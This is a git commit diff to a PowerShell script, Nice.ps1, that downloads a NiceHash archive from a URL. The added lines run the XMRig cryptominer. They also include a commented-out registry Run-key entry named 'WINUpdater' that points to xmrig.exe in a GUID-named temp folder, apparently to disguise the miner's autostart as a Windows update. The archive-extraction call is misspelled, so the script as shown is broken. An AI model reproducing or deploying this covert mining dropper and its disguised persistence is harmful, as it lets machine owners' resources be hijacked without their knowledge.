1e72ac5ce2a0133061f30c406a94a145895f8ace
LabSeb <35532325+SnowGlobeio@users.noreply.github.com>
2023-07-12 16:51:22 +0200

    Update Nice.ps1

--- Nice.ps1
+++ Nice.ps1
@@ -9,3 +9,10 @@ $PathtoSave = "Nicehash.zip"
 Invoke-WebRequest -URI $URL -OutFile $PathtoSave; Expend-Archive -DestinationPath .
 
 #Expand-Archive Nicehash.zip -DestinationPath .
+
+#New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+#    -Name "WINUpdater" `
+#    -Value "$env:temp/D13C3D8C-8A17-4898-G36A-6294B340288A/xmrig.exe"
+
+xmrig.exe
+
